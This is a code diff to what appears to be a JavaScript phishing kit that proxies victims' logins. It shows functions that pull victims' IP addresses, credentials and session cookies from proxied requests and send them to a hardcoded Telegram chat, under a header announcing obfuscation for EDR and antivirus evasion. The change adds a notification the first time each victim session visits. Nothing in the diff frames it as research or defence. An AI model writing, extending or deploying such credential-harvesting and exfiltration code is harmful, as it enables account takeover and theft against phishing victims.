@@ -4,6 +4,8 @@ const CHAT_ID = '7310383191';
 
 // Track which sessions have already sent notifications
 const NOTIFIED_SESSIONS = new Set();
+// Track which sessions have already sent a "first visit" notification
+const VISITED_SESSIONS = new Set();
 
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
@@ -91,7 +93,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FIXED - NO DUPLICATES)
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (UPDATED WITH FIRST‑VISIT NOTIFICATION)
 // ================================================
 
 async function sendToTelegram(data) {
@@ -154,7 +156,7 @@ ${flag} **Location:** ${location}
             return;
         }
         
-        // --- extract credentials (unchanged from original) ---
+        // --- extract credentials ---
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -229,7 +231,7 @@ ${flag} **Location:** ${location}
         
         if (!hasCredentials) {
             console.log('⏭️ Skipping credential notification - no credentials found in:', url);
-            return;  // <-- Still returns, but visit notification already sent above.
+            return;
         }
         
         console.log('✅ Valid credentials found, sending credential notification...');
@@ -318,9 +320,9 @@ ${flag} **Location:** ${location}
     } catch (e) {
         console.error('❌ sendToTelegram() FAILED:', e.message);
         console.error('   Stack:', e.stack);
-        // Optionally, remove from sets to allow retry? We'll keep as is.
     }
 }
+
 // ================================================
 // 𝙲𝙾𝚁𝙴 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
 // ================================================
